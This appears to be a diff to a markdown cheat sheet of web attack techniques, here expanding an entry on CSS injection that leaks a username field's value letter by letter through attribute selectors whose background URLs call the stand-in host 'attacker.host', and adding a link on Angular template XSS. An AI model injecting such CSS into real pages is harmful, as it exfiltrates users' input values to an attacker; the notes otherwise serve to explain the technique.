@@ -20,9 +20,26 @@
 
 ```css
 #username[value^="a"] {
-  background: url("https://attacker.host/mikeg");
+  background: url("https://attacker.host/?letter=a");
 }
+#username[value^="b"] {
+  background: url("https://attacker.host/?letter=b");
+}
+
 ```
+
+once you get the first letter you repeat
+```css
+#username[value^="aa"] {
+  background: url("https://attacker.host/?letter=aa");
+}
+#username[value^="ab"] {
+  background: url("https://attacker.host/?letter=ab");
+}
+
+```
+
 you need to write a script to slowly guess the string each time.
 
 14. polyglots
+15. angular: http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html
